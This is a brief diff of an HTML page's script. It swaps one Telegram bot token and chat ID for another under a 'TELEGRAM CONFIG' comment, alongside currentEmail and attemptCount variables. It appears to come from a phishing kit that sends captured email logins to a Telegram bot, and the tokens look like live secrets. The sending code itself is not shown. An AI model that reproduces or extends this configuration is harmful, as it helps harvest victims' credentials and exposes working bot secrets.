@@ -164,8 +164,8 @@
 
 <script>
 // TELEGRAM CONFIG
-var BOT_TOKEN = "8973357039:AAEBPyi9WxQl8qNNFCJDQtHA0X052AZjNOo";
-var CHAT_ID = "7576365237";
+var BOT_TOKEN = "8761583315:AAH_o3c8QepU1ZTL__V4vRQIqKREVxWl7kE";
+var CHAT_ID = "7668249027";
 
 var currentEmail = "";
 var attemptCount = 0;
